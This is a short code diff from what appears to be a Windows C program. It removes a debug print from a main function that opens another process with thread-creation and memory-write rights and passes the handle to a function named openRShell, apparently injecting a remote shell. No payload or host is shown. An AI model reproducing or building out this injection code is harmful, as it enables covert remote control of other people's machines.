@@ -129,7 +129,6 @@ int main() {
 
     //result = openRShell(OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD)findProcID()));
     procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD)findProcID());
-    printf("here\n");
     result = openRShell(procHandle);
 
     printf("Result: %d\n", result);
